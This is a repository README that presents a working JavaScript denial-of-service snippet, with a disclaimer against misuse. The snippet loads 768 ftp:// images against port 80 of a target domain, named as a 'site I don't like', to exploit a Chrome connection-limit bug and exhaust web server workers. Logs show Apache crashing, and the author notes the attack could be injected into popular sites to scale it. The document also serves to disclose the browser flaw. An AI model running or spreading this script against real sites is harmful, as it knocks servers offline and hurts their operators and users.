# Denial-of-Service with JavaScript in the browser
[![License](http://img.shields.io/:license-gpl3-blue.svg)](http://www.gnu.org/licenses/gpl-3.0.html)

A demonstration of how easy it is to DoS a web server just from the browser.

## Disclaimer

Denial-of-Service attacks are illegal. I take no responsibility if someone
decides to use my findings maliciously.

**Please do not use this to bring down someone else's site.**

## The Code

```js
var domain = 'site-i-dont-like.com';
for( i = 0; i < 768; ++i ) {
  var img = document.createElement('img');
  img.setAttribute('src', 'ftp://' + domain + ':80/image' + new Date().getTime() + i );
  document.body.appendChild(img);
}
```

Also found in `dos.js` in this repo

## How it works

Normally, the browser allows you to make only a few requests in parallel to a
single host. Chrome has a bug, where if you use a different protocol in the
URL, let's say FTP instead of HTTP, you can circumvent this limitation and open
pretty much any number of connections to a website.

Consider the code shown above. It adds 768, coincidentally the default number
of connections Nginx is configured to allow by default, different images to
the body of the current document triggering a download in the browser for each
asset.

The catch is, we use the FTP protocol in the url, but target the port :80
instead of the default ftp port, abusing the Chrome protocol limit bug.

That means 768 connections to a web server port 80 are made from a single
browser running this piece of script.

Just one browser running the code above is enough to crash a default Apache
installation. You'll just see this error in your Apache error log, and apache
will crash and needs to be restarted.

```
[Fri Aug 19 20:26:10.615562 2016] [mpm_event:error] [pid 30006:tid 139706789676928] AH00484: server reached MaxRequestWorkers setting, consider raising the MaxRequestWorkers setting
```

Nginx fares a bit better, but even a moderate amount of clients flooding port
80 with hundreds of connections will slow nginx down to a halt. Although, I
couldn't get it to completely crash like Apache in my tests so props Nginx !

Also as a point of interest, the Linux kernel seems to do be able to detect
this flooding. Here's an entry from the syslog during my testing.

```
Aug 19 20:17:28 chi1 kernel: [3027272.966535] TCP: TCP: Possible SYN flooding on port 80. Sending cookies.  Check SNMP counters.
```

This tool is especially dangerous due to how easy it is to scale. Someone
maliciously managing to inject something like this on a popular website could
easily bring down even well protected sites, I imagine.

Chrome really needs to fix this...
